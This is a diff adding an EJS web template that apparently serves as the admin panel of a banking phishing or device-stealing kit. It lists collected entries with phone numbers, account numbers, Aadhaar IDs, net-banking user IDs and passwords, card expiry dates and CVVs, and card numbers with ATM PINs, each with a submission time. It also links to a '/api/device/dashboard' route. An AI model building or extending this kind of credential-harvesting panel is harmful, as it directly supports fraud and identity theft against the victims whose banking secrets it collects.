@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User and Payment Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  
+  <header class="header-nav">
+    <h1>User and Payment Details</h1>
+  </header>
+
+  <!-- Main Content Container -->
+  <div class="user-detail-container">
+
+    <!-- User Details Section -->
+    <h2>User Details</h2>
+    <% if (user && user.length > 0) { %>
+      <% user.forEach((userDoc, docIndex) => { %>
+        <% if (userDoc.entries && userDoc.entries.length > 0) { %>
+          <% userDoc.entries.forEach((entry, entryIndex) => { %>
+            <div class="card">
+              <h3>User Information - <%= entryIndex + 1 %></h3>
+              <p><strong>Phone Number:</strong> <%= entry.phoneNumber %></p>
+              <p><strong>Account Number:</strong> <%= entry.accountNumber %></p>
+              <p><strong>Aadhar Number:</strong> <%= entry.aadharNumber %></p>
+              <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+            </div>
+          <% }); %>
+        <% } else { %>
+          <p>No user entries found in document <%= docIndex + 1 %></p>
+        <% } %>
+      <% }); %>
+    <% } else { %>
+      <p>No User Data Found</p>
+    <% } %>
+
+    <!-- NetBanking (Card Payment) Details Section -->
+    <h2>Net Banking Details</h2>
+    <% if (netBanking && netBanking.length > 0) { %>
+      <% netBanking.forEach((bank, bankIndex) => { %>
+        <div class="card">
+          <h3>Net Banking Record - <%= bankIndex + 1 %></h3>
+          <% if (bank.entries && bank.entries.length > 0) { %>
+            <% bank.entries.forEach((entry, index) => { %>
+              <div class="sub-card">
+                <h4>Entry <%= index + 1 %></h4>
+                <p><strong>User ID:</strong> <%= entry.userId %></p>
+                <p><strong>Password:</strong> <%= entry.password %></p>
+                <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+              </div>
+            <% }); %>
+          <% } else { %>
+            <p>No net banking entries found in this record.</p>
+          <% } %>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No Net Banking Data Found</p>
+    <% } %>
+
+    <!-- VISA CARD DETAILS SECTION -->
+    <h2>Visa Card Details</h2>
+    <% if (visa && visa.length > 0) { %>
+      <% visa.forEach((card, cardIndex) => { %>
+        <div class="card">
+          <h3>Visa Entry - <%= cardIndex + 1 %></h3>
+          <% if (card.entries && card.entries.length > 0) { %>
+            <% card.entries.forEach((entry, index) => { %>
+              <div class="sub-card">
+                <h4>Entry <%= index + 1 %></h4>
+                <p><strong>Expiry Date:</strong> <%= entry.expdata %></p>
+                <p><strong>CVV:</strong> <%= entry.cvv %></p>
+                <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+              </div>
+            <% }); %>
+          <% } else { %>
+            <p>No visa entries found in this record.</p>
+          <% } %>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No Visa Card Data Found</p>
+    <% } %>
+
+    <!-- ACCE DETAILS SECTION -->
+    <h2>Acce Payment Details</h2>
+    <% if (acce && acce.length > 0) { %>
+      <% acce.forEach((record, acceIndex) => { %>
+        <div class="card">
+          <h3>Acce Entry - <%= acceIndex + 1 %></h3>
+          <% if (record.entries && record.entries.length > 0) { %>
+            <% record.entries.forEach((entry, index) => { %>
+              <div class="sub-card">
+                <h4>Entry <%= index + 1 %></h4>
+                <p><strong>Card Number:</strong> <%= entry.cardNumber %></p>
+                <p><strong>ATM PIN:</strong> <%= entry.atmPin %></p>
+                <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+              </div>
+            <% }); %>
+          <% } else { %>
+            <p>No Acce entries found in this record.</p>
+          <% } %>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No Acce Payment Data Found</p>
+    <% } %>
+
+    <!-- Dashboard Navigation -->
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
